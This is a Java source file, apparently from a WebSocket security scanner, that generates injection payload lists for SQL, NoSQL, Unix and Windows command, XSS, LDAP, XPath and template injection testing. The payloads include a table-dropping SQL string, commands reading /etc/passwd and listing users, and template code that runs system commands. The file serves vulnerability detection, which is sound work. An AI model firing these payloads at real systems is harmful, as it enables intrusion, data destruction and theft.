/*
 * © 2023 Snyk Limited
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package socketsleuth.scanner.payloads;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

/**
 * Centralized payload generation for various injection attack types.
 */
public class PayloadGenerator {

    // ============= SQL Injection Payloads =============
    
    /**
     * Basic SQL injection payloads for error-based detection.
     */
    public static List<String> getSqlErrorPayloads() {
        return Arrays.asList(
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' --",
                "\" OR \"1\"=\"1\" --",
                "'; --",
                "\"; --",
                "1' OR '1'='1",
                "1\" OR \"1\"=\"1",
                "' AND '1'='2",
                "') OR ('1'='1",
                "')) OR (('1'='1",
                "1 OR 1=1",
                "1' OR 1=1 --",
                "admin'--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1; DROP TABLE users--"
        );
    }

    /**
     * Time-based blind SQL injection payloads.
     */
    public static List<String> getSqlTimeBasedPayloads() {
        return Arrays.asList(
                // MySQL
                "' OR SLEEP(5)--",
                "1' AND SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                // PostgreSQL
                "'; SELECT pg_sleep(5)--",
                "' OR pg_sleep(5)--",
                // MSSQL
                "'; WAITFOR DELAY '00:00:05'--",
                "1; WAITFOR DELAY '00:00:05'--",
                // Oracle
                "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                // SQLite
                "' OR randomblob(500000000)--"
        );
    }

    /**
     * Combined SQL injection payloads (error + time-based).
     */
    public static List<String> getAllSqlPayloads() {
        List<String> all = new ArrayList<>();
        all.addAll(getSqlErrorPayloads());
        all.addAll(getSqlTimeBasedPayloads());
        return all;
    }

    // ============= NoSQL Injection Payloads =============

    /**
     * MongoDB injection payloads.
     */
    public static List<String> getMongoDbPayloads() {
        return Arrays.asList(
                // Operator injection
                "{\"$gt\":\"\"}",
                "{\"$ne\":null}",
                "{\"$ne\":\"\"}",
                "{\"$gt\":0}",
                "{\"$gte\":0}",
                "{\"$exists\":true}",
                "{\"$regex\":\".*\"}",
                // Where injection
                "'; return true; //",
                "'; return '1'=='1'; //",
                "1; return true; })",
                "'; return this.password; //",
                // Array injection
                "{\"$in\":[true,false]}",
                "{\"$nin\":[]}",
                // Boolean bypass
                "true",
                "false",
                "null"
        );
    }

    /**
     * CouchDB injection payloads.
     */
    public static List<String> getCouchDbPayloads() {
        return Arrays.asList(
                "{\"_id\":\"_all_docs\"}",
                "{\"selector\":{\"$or\":[{\"_id\":{\"$gt\":null}}]}}",
                "\"_all_docs\"",
                "{\"keys\":[]}",
                "{\"startkey\":\"\",\"endkey\":\"\\ufff0\"}"
        );
    }

    /**
     * Combined NoSQL injection payloads.
     */
    public static List<String> getAllNoSqlPayloads() {
        List<String> all = new ArrayList<>();
        all.addAll(getMongoDbPayloads());
        all.addAll(getCouchDbPayloads());
        return all;
    }

    // ============= Command Injection Payloads =============

    /**
     * Unix/Linux command injection payloads.
     */
    public static List<String> getUnixCommandPayloads() {
        return Arrays.asList(
                "; id",
                "| id",
                "|| id",
                "&& id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami",
                "$(whoami)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; sleep 5",
                "| sleep 5",
                "$(sleep 5)",
                "`sleep 5`",
                "; ping -c 5 127.0.0.1",
                "| ls -la",
                "; uname -a",
                "\n id",
                "\r\n id"
        );
    }

    /**
     * Windows command injection payloads.
     */
    public static List<String> getWindowsCommandPayloads() {
        return Arrays.asList(
                "& whoami",
                "| whoami",
                "|| whoami",
                "&& whoami",
                "& dir",
                "| dir",
                "& type C:\\Windows\\win.ini",
                "& ping -n 5 127.0.0.1",
                "& timeout /t 5",
                "| net user",
                "& ipconfig /all",
                "& systeminfo",
                "\r\n whoami",
                "& echo %USERNAME%"
        );
    }

    /**
     * Combined command injection payloads.
     */
    public static List<String> getAllCommandPayloads() {
        List<String> all = new ArrayList<>();
        all.addAll(getUnixCommandPayloads());
        all.addAll(getWindowsCommandPayloads());
        return all;
    }

    // ============= XSS Payloads =============

    /**
     * Basic XSS payloads.
     */
    public static List<String> getBasicXssPayloads() {
        return Arrays.asList(
                "<script>alert(1)</script>",
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=\"javascript:alert(1)\">",
                "javascript:alert(1)",
                "<a href=\"javascript:alert(1)\">click</a>",
                "'\"><script>alert(1)</script>",
                "\"'><script>alert(1)</script>",
                "<IMG SRC=\"javascript:alert('XSS');\">",
                "<IMG SRC=javascript:alert('XSS')>",
                "<div onmouseover=\"alert(1)\">hover</div>"
        );
    }

    /**
     * Encoded XSS payloads.
     */
    public static List<String> getEncodedXssPayloads() {
        return Arrays.asList(
                // HTML entity encoding
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                // URL encoding
                "%3Cscript%3Ealert(1)%3C/script%3E",
                // Unicode encoding
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                // Mixed case
                "<ScRiPt>alert(1)</ScRiPt>",
                "<SCRIPT>alert(1)</SCRIPT>",
                // Null byte injection
                "<scr%00ipt>alert(1)</scr%00ipt>",
                // Double encoding
                "%253Cscript%253Ealert(1)%253C/script%253E"
        );
    }

    /**
     * Event handler XSS payloads.
     */
    public static List<String> getEventHandlerXssPayloads() {
        return Arrays.asList(
                "\" onmouseover=\"alert(1)\"",
                "' onmouseover='alert(1)'",
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "' onfocus='alert(1)' autofocus='",
                "\" onclick=\"alert(1)\"",
                "' onerror='alert(1)'",
                "\" onload=\"alert(1)\"",
                "' onchange='alert(1)'"
        );
    }

    /**
     * Combined XSS payloads.
     */
    public static List<String> getAllXssPayloads() {
        List<String> all = new ArrayList<>();
        all.addAll(getBasicXssPayloads());
        all.addAll(getEncodedXssPayloads());
        all.addAll(getEventHandlerXssPayloads());
        return all;
    }

    // ============= LDAP Injection Payloads =============

    /**
     * LDAP injection payloads.
     */
    public static List<String> getLdapPayloads() {
        return Arrays.asList(
                "*",
                ")",
                "*))",
                "*))%00",
                ")(cn=*",
                ")(|(cn=*",
                "*)(uid=*))(|(uid=*",
                "*()|%26'",
                "admin)(&)",
                "admin)(|(password=*)",
                "*))(|(objectClass=*",
                "x)(|(objectClass=*",
                "*)(objectClass=user))",
                "admin)(!(&(1=0",
                "*))(|(uid=*))(",
                "*))%00"
        );
    }

    // ============= XPath Injection Payloads =============

    /**
     * XPath injection payloads.
     */
    public static List<String> getXpathPayloads() {
        return Arrays.asList(
                "'",
                "\"",
                "' or '1'='1",
                "\" or \"1\"=\"1",
                "' or ''='",
                "\" or \"\"=\"",
                "') or ('1'='1",
                "\") or (\"1\"=\"1",
                "1 or 1=1",
                "' or 1=1 or '",
                "\" or 1=1 or \"",
                "']|//password|/foo['",
                "\"]/password/text()|/foo[\"",
                "' or count(//*)>0 or '",
                "' or string-length(//*)>0 or '",
                "' and '1'='2' or '",
                "']//*|//*['",
                "admin' or '1'='1"
        );
    }

    // ============= Template Injection Payloads =============

    /**
     * Server-Side Template Injection (SSTI) payloads.
     */
    public static List<String> getSstiPayloads() {
        return Arrays.asList(
                // Generic
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "*{7*7}",
                // Jinja2/Twig
                "{{config}}",
                "{{self.__class__}}",
                // Freemarker
                "${\"freemarker\".class}",
                // Velocity
                "#set($x=7*7)$x",
                // ERB
                "<%= system('id') %>"
        );
    }

    // ============= Helper Methods =============

    /**
     * Gets a quick test set of payloads for initial detection.
     * One or two payloads from each category.
     */
    public static List<String> getQuickTestPayloads() {
        return Arrays.asList(
                "'",                          // SQL
                "{\"$gt\":\"\"}",            // NoSQL
                "; id",                       // Command
                "<script>alert(1)</script>", // XSS
                "*",                          // LDAP
                "' or '1'='1"                // XPath
        );
    }

    /**
     * Creates payloads that combine the original value with the payload.
     * 
     * @param originalValue The original parameter value
     * @param payloads      The payloads to append
     * @return List of combined payloads
     */
    public static List<String> createAppendedPayloads(String originalValue, List<String> payloads) {
        List<String> result = new ArrayList<>();
        for (String payload : payloads) {
            result.add(originalValue + payload);
        }
        return result;
    }
}
